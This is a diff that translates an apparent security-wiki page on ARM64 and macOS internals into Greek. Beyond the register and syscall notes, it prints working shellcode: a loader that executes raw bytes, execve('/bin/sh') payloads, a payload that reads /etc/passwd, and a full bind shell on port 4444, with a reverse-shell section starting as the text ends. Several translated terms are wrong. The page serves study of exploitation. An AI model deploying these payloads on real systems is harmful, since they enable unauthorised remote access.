+Για παράδειγμα, η εντολή **`UADD8`** **προσθέτει τέσσερις ζεύγους byte** (από δύο 32-bit operands) παράλληλα και αποθηκεύει τα αποτελέσματα σε έναν 32-bit καταχωρητή. Στη συνέχεια **ρυθμίζει τις σημαίες `GE` στο `APSR`** με βάση αυτά τα αποτελέσματα. Κάθε σημαία GE αντιστοιχεί σε μία από τις προσθέσεις byte, υποδεικνύοντας αν η πρόσθεση για αυτό το ζεύγος byte **υπερχειλίζει**.
 
-  The **`SEL`** instruction uses these GE flags to perform conditional actions.
+Η εντολή **`SEL`** χρησιμοποιεί αυτές τις σημαίες GE για να εκτελέσει συνθήκες.
 
 #### Execution State Registers
 
-- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
-- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
-- **`E`** bit: Indicates the **endianness**.
-- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.
+- Τα bits **`J`** και **`T`**: **`J`** πρέπει να είναι 0 και αν **`T`** είναι 0 χρησιμοποιείται το σύνολο εντολών A32, και αν είναι 1, χρησιμοποιείται το T32.
+- **IT Block State Register** (`ITSTATE`): Αυτά είναι τα bits από 10-15 και 25-26. Αποθηκεύουν συνθήκες για εντολές μέσα σε μια ομάδα με πρόθεμα **`IT`**.
+- Το bit **`E`**: Υποδεικνύει την **endianness**.
+- **Bits Μάσκας Λειτουργίας και Εξαίρεσης** (0-4): Καθορίζουν την τρέχουσα κατάσταση εκτέλεσης. Το **5ο** υποδεικνύει αν το πρόγραμμα εκτελείται ως 32bit (ένα 1) ή 64bit (ένα 0). Τα άλλα 4 αντιπροσωπεύουν την **τρέχουσα κατάσταση εξαίρεσης** (όταν συμβαίνει μια εξαίρεση και διαχειρίζεται). Ο αριθμός που έχει ρυθμιστεί **υποδεικνύει την τρέχουσα προτεραιότητα** σε περίπτωση που προκληθεί άλλη εξαίρεση ενώ αυτή διαχειρίζεται.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
+- **`AIF`**: Ορισμένες εξαιρέσεις μπορούν να απενεργοποιηθούν χρησιμοποιώντας τα bits **`A`**, `I`, `F`. Αν **`A`** είναι 1 σημαίνει ότι θα προκληθούν **ασύγχρονοι τερματισμοί**. Το **`I`** ρυθμίζει την αντίδραση σε εξωτερικά αιτήματα διακοπής **Interrupts Requests** (IRQs). και το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
 
 ## macOS
 
 ### BSD syscalls
 
-Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls will have **x16 > 0**.
+Δείτε το [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Οι BSD syscalls θα έχουν **x16 > 0**.
 
 ### Mach Traps
 
-Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+Δείτε στο [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) τον `mach_trap_table` και στο [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) τα πρωτότυπα. Ο μέγιστος αριθμός Mach traps είναι `MACH_TRAP_TABLE_COUNT` = 128. Οι Mach traps θα έχουν **x16 < 0**, οπότε πρέπει να καλέσετε τους αριθμούς από την προηγούμενη λίστα με ένα **μείον**: **`_kernelrpc_mach_vm_allocate_trap`** είναι **`-10`**.
 
-You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
-
+Μπορείτε επίσης να ελέγξετε το **`libsystem_kernel.dylib`** σε έναν αποσυμπιεστή για να βρείτε πώς να καλέσετε αυτές τις (και τις BSD) syscalls:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -332,34 +325,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-
-Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.
+Σημειώστε ότι **Ida** και **Ghidra** μπορούν επίσης να αποσυμπιέσουν **συγκεκριμένα dylibs** από την κρυφή μνήμη απλά περνώντας την κρυφή μνήμη.
 
 > [!TIP]
-> Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code) while in the dylib you can find what is being called.
+> Μερικές φορές είναι πιο εύκολο να ελέγξετε τον **αποσυμπιεσμένο** κώδικα από το **`libsystem_kernel.dylib`** **παρά** να ελέγξετε τον **πηγαίο κώδικα** επειδή ο κώδικας αρκετών syscalls (BSD και Mach) παράγεται μέσω scripts (ελέγξτε τα σχόλια στον πηγαίο κώδικα) ενώ στο dylib μπορείτε να βρείτε τι καλείται.
 
 ### machdep calls
 
-XNU supports another type of calls called machine dependent. The numbers of these calls depends on the architecture and neither the calls or numbers are guaranteed to remain constant.
+Το XNU υποστηρίζει έναν άλλο τύπο κλήσεων που ονομάζονται εξαρτώμενες από τη μηχανή. Οι αριθμοί αυτών των κλήσεων εξαρτώνται από την αρχιτεκτονική και ούτε οι κλήσεις ούτε οι αριθμοί είναι εγγυημένο ότι θα παραμείνουν σταθεροί.
 
 ### comm page
 
-This is a kernel owner memory page that is mapped into the address scape of every users process. It's meant to make the transition from user mode to kernel space faster than using syscalls for kernel services that are used so much the this transition would be vey inneficient.
+Αυτή είναι μια σελίδα μνήμης που ανήκει στον πυρήνα και είναι χαρτογραφημένη στο χώρο διευθύνσεων κάθε διεργασίας χρήστη. Σκοπός της είναι να διευκολύνει τη μετάβαση από τη λειτουργία χρήστη στον χώρο του πυρήνα πιο γρήγορα από τη χρήση syscalls για υπηρεσίες πυρήνα που χρησιμοποιούνται τόσο πολύ ώστε αυτή η μετάβαση θα ήταν πολύ αναποτελεσματική.
 
-For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.
+Για παράδειγμα, η κλήση `gettimeofdate` διαβάζει την τιμή του `timeval` απευθείας από τη σελίδα comm.
 
 ### objc_msgSend
 
-It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.
+Είναι πολύ συνηθισμένο να βρείτε αυτή τη λειτουργία να χρησιμοποιείται σε προγράμματα Objective-C ή Swift. Αυτή η λειτουργία επιτρέπει την κλήση μιας μεθόδου ενός αντικειμένου Objective-C.
 
-Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
+Παράμετροι ([περισσότερες πληροφορίες στα docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
-- x0: self -> Pointer to the instance
-- x1: op -> Selector of the method
-- x2... -> Rest of the arguments of the invoked method
+- x0: self -> Δείκτης στην περίπτωση
+- x1: op -> Επιλογέας της μεθόδου
+- x2... -> Υπόλοιπες παράμετροι της καλούμενης μεθόδου
 
-So, if you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example the object calls an object from `NSConcreteTask` that will run a command):
-
+Έτσι, αν βάλετε σημείο διακοπής πριν από τον κλάδο σε αυτή τη λειτουργία, μπορείτε εύκολα να βρείτε τι καλείται στο lldb με (σε αυτό το παράδειγμα το αντικείμενο καλεί ένα αντικείμενο από το `NSConcreteTask` που θα εκτελέσει μια εντολή):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -377,34 +368,32 @@ So, if you put breakpoint before the branch to this function, you can easily fin
 whoami
 )
 ```
-
 > [!TIP]
-> Setting the env variable **`NSObjCMessageLoggingEnabled=1`** it's possible to log when this function is called in a file like `/tmp/msgSends-pid`.
+> Ρυθμίζοντας τη μεταβλητή env **`NSObjCMessageLoggingEnabled=1`** είναι δυνατή η καταγραφή όταν καλείται αυτή η συνάρτηση σε ένα αρχείο όπως το `/tmp/msgSends-pid`.
 >
-> Moreover, setting **`OBJC_HELP=1`** and calling any binary you can see other environment variables you could use to **log** when certain Objc-C actions occurs.
+> Επιπλέον, ρυθμίζοντας **`OBJC_HELP=1`** και καλώντας οποιοδήποτε δυαδικό, μπορείτε να δείτε άλλες μεταβλητές περιβάλλοντος που θα μπορούσατε να χρησιμοποιήσετε για να **log** όταν συμβαίνουν ορισμένες ενέργειες Objc-C.
 
-When this function is called, it's needed to find the called method of the indicated instance, for this different searches are made:
+Όταν καλείται αυτή η συνάρτηση, είναι απαραίτητο να βρείτε τη μέθοδο που καλείται από την υποδεικνυόμενη παρουσία, για αυτό γίνονται διαφορετικές αναζητήσεις:
 
-- Perform optimistic cache lookup:
-  - If successful, done
-- Acquire runtimeLock (read)
-  - If (realize && !cls->realized) realize class
-  - If (initialize && !cls->initialized) initialize class
-- Try class own cache:
-  - If successful, done
-- Try class method list:
-  - If found, fill cache and done
-- Try superclass cache:
-  - If successful, done
-- Try superclass method list:
-  - If found, fill cache and done
-- If (resolver) try method resolver, and repeat from class lookup
-- If still here (= all else has failed) try forwarder
+- Εκτέλεση αισιόδοξης αναζήτησης cache:
+- Αν είναι επιτυχής, ολοκληρώθηκε
+- Απόκτηση runtimeLock (ανάγνωση)
+- Αν (realize && !cls->realized) πραγματοποιήστε την πραγματοποίηση της κλάσης
+- Αν (initialize && !cls->initialized) πραγματοποιήστε την αρχικοποίηση της κλάσης
+- Δοκιμάστε την cache της κλάσης:
+- Αν είναι επιτυχής, ολοκληρώθηκε
+- Δοκιμάστε τη λίστα μεθόδων της κλάσης:
+- Αν βρεθεί, γεμίστε την cache και ολοκληρώθηκε
+- Δοκιμάστε την cache της υπερκλάσης:
+- Αν είναι επιτυχής, ολοκληρώθηκε
+- Δοκιμάστε τη λίστα μεθόδων της υπερκλάσης:
+- Αν βρεθεί, γεμίστε την cache και ολοκληρώθηκε
+- Αν (resolver) δοκιμάστε τον επιλυτή μεθόδων και επαναλάβετε από την αναζήτηση κλάσης
+- Αν είστε ακόμα εδώ (= όλα τα άλλα έχουν αποτύχει) δοκιμάστε τον προωθητή
 
 ### Shellcodes
 
-To compile:
-
+Για να μεταγλωττίσετε:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -412,29 +401,23 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-
-To extract the bytes:
-
+Για να εξαγάγετε τα bytes:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
-    echo -n '\\x'$c
+echo -n '\\x'$c
 done
 ```
-
-For newer macOS:
-
+Για νεότερες εκδόσεις macOS:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
 for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
-    echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
+echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
 done
 ```
-
 <details>
 
-<summary>C code to test the shellcode</summary>
-
+<summary>Κώδικας C για τη δοκιμή του shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -448,100 +431,94 @@ int (*sc)();
 char shellcode[] = "<INSERT SHELLCODE HERE>";
 
 int main(int argc, char **argv) {
-    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        exit(-1);
-    }
-    printf("[+] SUCCESS: mmap\n");
-    printf("    |-> Return = %p\n", ptr);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+exit(-1);
+}
+printf("[+] SUCCESS: mmap\n");
+printf("    |-> Return = %p\n", ptr);
 
-    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-    printf("[+] SUCCESS: memcpy\n");
-    printf("    |-> Return = %p\n", dst);
+void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
+printf("[+] SUCCESS: memcpy\n");
+printf("    |-> Return = %p\n", dst);
 
-    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
 
-    if (status == -1) {
-        perror("mprotect");
-        exit(-1);
-    }
-    printf("[+] SUCCESS: mprotect\n");
-    printf("    |-> Return = %d\n", status);
+if (status == -1) {
+perror("mprotect");
+exit(-1);
+}
+printf("[+] SUCCESS: mprotect\n");
+printf("    |-> Return = %d\n", status);
 
-    printf("[>] Trying to execute shellcode...\n");
+printf("[>] Trying to execute shellcode...\n");
 
-    sc = ptr;
-    sc();
+sc = ptr;
+sc();
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
 
 #### Shell
 
-Taken from [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) and explained.
+Ληφθέν από [**εδώ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) και εξηγημένο.
 
 {{#tabs}}
 {{#tab name="with adr"}}
-
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
 .align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
 _main:
-    adr  x0, sh_path  ; This is the address of "/bin/sh".
-    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
-    mov  x16, #59     ; Move the execve syscall number (59) into x16.
-    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+adr  x0, sh_path  ; This is the address of "/bin/sh".
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 sh_path: .asciz "/bin/sh"
 ```
-
 {{#endtab}}
 
-{{#tab name="with stack"}}
-
+{{#tab name="με στοίβα"}}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
 .align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
 _main:
-    ; We are going to build the string "/bin/sh" and place it on the stack.
+; We are going to build the string "/bin/sh" and place it on the stack.
 
-    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
-    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
-    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
-    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
+movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
+movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
+movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
 
-    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
 
-    ; Prepare arguments for the execve syscall.
+; Prepare arguments for the execve syscall.
 
-    mov  x1, #8       ; Set x1 to 8.
-    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
-    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov  x1, #8       ; Set x1 to 8.
+sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
 
-    ; Make the syscall.
+; Make the syscall.
 
-    mov  x16, #59     ; Move the execve syscall number (59) into x16.
-    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 ```
-
 {{#endtab}}
 
-{{#tab name="with adr for linux"}}
-
+{{#tab name="με adr για linux"}}
 ```armasm
 ; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -549,84 +526,80 @@ _main:
 .align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
 _main:
-    adr  x0, sh_path  ; This is the address of "/bin/sh".
-    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
-    mov  x16, #59     ; Move the execve syscall number (59) into x16.
-    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+adr  x0, sh_path  ; This is the address of "/bin/sh".
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 sh_path: .asciz "/bin/sh"
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-#### Read with cat
+#### Διαβάστε με cat
 
-The goal is to execute `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, so the second argument (x1) is an array of params (which in memory these means a stack of the addresses).
-
+Ο στόχος είναι να εκτελέσετε `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, έτσι ώστε το δεύτερο επιχείρημα (x1) να είναι ένας πίνακας παραμέτρων (που στη μνήμη σημαίνει μια στοίβα διευθύνσεων).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
 .align 2                   ; Align the beginning of the following code to a 4-byte boundary
 
 _main:
-    ; Prepare the arguments for the execve syscall
-    sub sp, sp, #48        ; Allocate space on the stack
-    mov x1, sp             ; x1 will hold the address of the argument array
-    adr x0, cat_path
-    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
-    adr x0, passwd_path    ; Get the address of "/etc/passwd"
-    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
-    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
+; Prepare the arguments for the execve syscall
+sub sp, sp, #48        ; Allocate space on the stack
+mov x1, sp             ; x1 will hold the address of the argument array
+adr x0, cat_path
+str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
+adr x0, passwd_path    ; Get the address of "/etc/passwd"
+str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
+str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
 
-    adr x0, cat_path
-    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
-    mov x16, #59           ; Load the syscall number for execve (59) into x8
-    svc 0                  ; Make the syscall
+adr x0, cat_path
+mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+mov x16, #59           ; Load the syscall number for execve (59) into x8
+svc 0                  ; Make the syscall
 
 
 cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-
-#### Invoke command with sh from a fork so the main process is not killed
-
+#### Καλέστε την εντολή με sh από ένα fork ώστε η κύρια διαδικασία να μην τερματιστεί
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
 .align 2                   ; Align the beginning of the following code to a 4-byte boundary
 
 _main:
-    ; Prepare the arguments for the fork syscall
-    mov x16, #2            ; Load the syscall number for fork (2) into x8
-    svc 0                  ; Make the syscall
-    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
-    beq _loop              ; If not child process, loop
+; Prepare the arguments for the fork syscall
+mov x16, #2            ; Load the syscall number for fork (2) into x8
+svc 0                  ; Make the syscall
+cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
+beq _loop              ; If not child process, loop
 
-    ; Prepare the arguments for the execve syscall
+; Prepare the arguments for the execve syscall
 
-    sub sp, sp, #64        ; Allocate space on the stack
-    mov x1, sp             ; x1 will hold the address of the argument array
-    adr x0, sh_path
-    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
-    adr x0, sh_c_option    ; Get the address of "-c"
-    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
-    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
-    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
-    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
+sub sp, sp, #64        ; Allocate space on the stack
+mov x1, sp             ; x1 will hold the address of the argument array
+adr x0, sh_path
+str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
+adr x0, sh_c_option    ; Get the address of "-c"
+str x0, [x1, #8]       ; Store the address of "-c" as the second argument
+adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
+str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
+str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
 
-    adr x0, sh_path
-    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
-    mov x16, #59           ; Load the syscall number for execve (59) into x8
-    svc 0                  ; Make the syscall
+adr x0, sh_path
+mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+mov x16, #59           ; Load the syscall number for execve (59) into x8
+svc 0                  ; Make the syscall
 
 
 _exit:
-    mov x16, #1            ; Load the syscall number for exit (1) into x8
-    mov x0, #0             ; Set exit status code to 0
-    svc 0                  ; Make the syscall
+mov x16, #1            ; Load the syscall number for exit (1) into x8
+mov x0, #0             ; Set exit status code to 0
+svc 0                  ; Make the syscall
 
 _loop: b _loop
 
@@ -636,162 +609,157 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-
 #### Bind shell
 
-Bind shell from [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **port 4444**
-
+Bind shell από [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) σε **port 4444**
 ```armasm
 .section __TEXT,__text
 .global _main
 .align 2
 _main:
 call_socket:
-    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
-    mov  x16, #97
-    lsr  x1, x16, #6
-    lsl  x0, x1, #1
-    mov  x2, xzr
-    svc  #0x1337
+// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+mov  x16, #97
+lsr  x1, x16, #6
+lsl  x0, x1, #1
+mov  x2, xzr
+svc  #0x1337
 
-    // save s
-    mvn  x3, x0
+// save s
+mvn  x3, x0
 
 call_bind:
-    /*
-     * bind(s, &sockaddr, 0x10)
-     *
-     * struct sockaddr_in {
-     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
-     *     sa_family_t     sin_family;  // AF_INET = 2
-     *     in_port_t       sin_port;    // 4444 = 0x115C
-     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
-     *     char            sin_zero[8]; // Don't care
-     * };
-     */
-    mov  x1, #0x0210
-    movk x1, #0x5C11, lsl #16
-    str  x1, [sp, #-8]
-    mov  x2, #8
-    sub  x1, sp, x2
-    mov  x2, #16
-    mov  x16, #104
-    svc  #0x1337
+/*
+* bind(s, &sockaddr, 0x10)
+*
+* struct sockaddr_in {
+*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+*     sa_family_t     sin_family;  // AF_INET = 2
+*     in_port_t       sin_port;    // 4444 = 0x115C
+*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
+*     char            sin_zero[8]; // Don't care
+* };
+*/
+mov  x1, #0x0210
+movk x1, #0x5C11, lsl #16
+str  x1, [sp, #-8]
+mov  x2, #8
+sub  x1, sp, x2
+mov  x2, #16
+mov  x16, #104
+svc  #0x1337
 
 call_listen:
-    // listen(s, 2)
-    mvn  x0, x3
-    lsr  x1, x2, #3
-    mov  x16, #106
-    svc  #0x1337
+// listen(s, 2)
+mvn  x0, x3
+lsr  x1, x2, #3
+mov  x16, #106
+svc  #0x1337
 
 call_accept:
-    // c = accept(s, 0, 0)
-    mvn  x0, x3
-    mov  x1, xzr
-    mov  x2, xzr
-    mov  x16, #30
-    svc  #0x1337
+// c = accept(s, 0, 0)
+mvn  x0, x3
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #30
+svc  #0x1337
 
-    mvn  x3, x0
-    lsr  x2, x16, #4
-    lsl  x2, x2, #2
+mvn  x3, x0
+lsr  x2, x16, #4
+lsl  x2, x2, #2
 
 call_dup:
-    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
-    mvn  x0, x3
-    lsr  x2, x2, #1
-    mov  x1, x2
-    mov  x16, #90
-    svc  #0x1337
-    mov  x10, xzr
-    cmp  x10, x2
-    bne  call_dup
+// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
+mvn  x0, x3
+lsr  x2, x2, #1
+mov  x1, x2
+mov  x16, #90
+svc  #0x1337
+mov  x10, xzr
+cmp  x10, x2
+bne  call_dup
 
 call_execve:
-    // execve("/bin/sh", 0, 0)
-    mov  x1, #0x622F
-    movk x1, #0x6E69, lsl #16
-    movk x1, #0x732F, lsl #32
-    movk x1, #0x68, lsl #48
-    str  x1, [sp, #-8]
-    mov	 x1, #8
-    sub  x0, sp, x1
-    mov  x1, xzr
-    mov  x2, xzr
-    mov  x16, #59
-    svc  #0x1337
+// execve("/bin/sh", 0, 0)
+mov  x1, #0x622F
+movk x1, #0x6E69, lsl #16
+movk x1, #0x732F, lsl #32
+movk x1, #0x68, lsl #48
+str  x1, [sp, #-8]
+mov	 x1, #8
+sub  x0, sp, x1
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #59
+svc  #0x1337
 ```
+#### Αντίστροφη θήκη
 
-#### Reverse shell
-
-From [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
-
